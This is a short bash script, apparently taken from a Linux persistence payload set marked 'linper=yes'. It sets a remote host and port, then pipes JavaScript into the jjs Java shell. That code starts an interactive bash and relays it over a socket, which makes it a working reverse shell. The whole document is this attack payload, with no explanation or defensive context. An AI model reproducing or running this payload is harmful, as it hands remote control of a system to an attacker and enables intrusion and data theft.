linper=yes

#!/bin/bash

export RHOST=0.0.0.0
export RPORT=5253
echo 'var host=Java.type("java.lang.System").getenv("RHOST");var port=Java.type("java.lang.System").getenv("RPORT");var ProcessBuilder = Java.type("java.lang.ProcessBuilder");var p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();var Socket = Java.type("java.net.Socket");var s=new Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs
